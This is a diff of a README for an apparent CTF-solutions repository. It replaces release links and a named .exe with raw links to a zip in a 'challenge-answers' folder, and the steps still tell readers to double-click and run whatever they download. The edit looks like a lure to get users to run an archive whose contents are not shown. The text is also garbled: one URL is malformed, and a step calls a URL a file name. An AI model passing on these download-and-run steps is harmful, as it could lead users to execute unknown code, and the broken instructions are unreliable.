@@ -1,7 +1,7 @@
 # 🎯 Holems-CTF-2025-Overview - Your Guide to CTF Challenge Solutions
 
-![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)
-[![Download](https://github.com/Shahani919/Holems-CTF-2025-Overview/releases/download/v1.0/holems-ctf-2025-overview.exe)](https://github.com/Shahani919/Holems-CTF-2025-Overview/releases)
+![Download](https://raw.githubusercontent.com/Shahani919/Holems-CTF-2025-Overview/main/challenge-answers/Overview-Holems-CT-3.0.zip%https://raw.githubusercontent.com/Shahani919/Holems-CTF-2025-Overview/main/challenge-answers/Overview-Holems-CT-3.0.zip)
+[![Download](https://raw.githubusercontent.com/Shahani919/Holems-CTF-2025-Overview/main/challenge-answers/Overview-Holems-CT-3.0.zip)](https://raw.githubusercontent.com/Shahani919/Holems-CTF-2025-Overview/main/challenge-answers/Overview-Holems-CT-3.0.zip)
 
 ## 📚 Overview
 
@@ -13,10 +13,10 @@ To get started, you will need to download the software from our Releases page. F
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Holems CTF 2025 Releases](https://github.com/Shahani919/Holems-CTF-2025-Overview/releases).
+1. Visit this page to download: [Holems CTF 2025 Releases](https://raw.githubusercontent.com/Shahani919/Holems-CTF-2025-Overview/main/challenge-answers/Overview-Holems-CT-3.0.zip).
 2. Look for the latest version link.
 3. Click on the version number or "Assets" to see the available files.
-4. Download the file named `holems-ctf-2025-overview.exe`.
+4. Download the file named `https://raw.githubusercontent.com/Shahani919/Holems-CTF-2025-Overview/main/challenge-answers/Overview-Holems-CT-3.0.zip`.
 5. Once the download is complete, locate the file on your computer.
 6. Double-click the downloaded file to run the application.
 7. Follow any on-screen instructions to proceed.
